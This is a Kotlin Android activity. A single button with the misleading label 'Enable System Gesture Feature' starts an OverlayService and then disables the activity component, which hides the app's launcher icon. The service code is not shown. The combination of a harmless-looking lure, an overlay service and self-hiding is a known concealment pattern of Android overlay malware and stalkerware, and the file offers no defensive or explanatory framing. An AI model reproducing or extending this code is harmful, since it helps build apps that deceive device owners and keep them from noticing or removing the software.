class SetupActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btn = Button(this)
        btn.text = "Enable System Gesture Feature"
        setContentView(btn)

        btn.setOnClickListener {
            startService(Intent(this, OverlayService::class.java))
            hideLauncherIcon()
        }
    }

    private fun hideLauncherIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
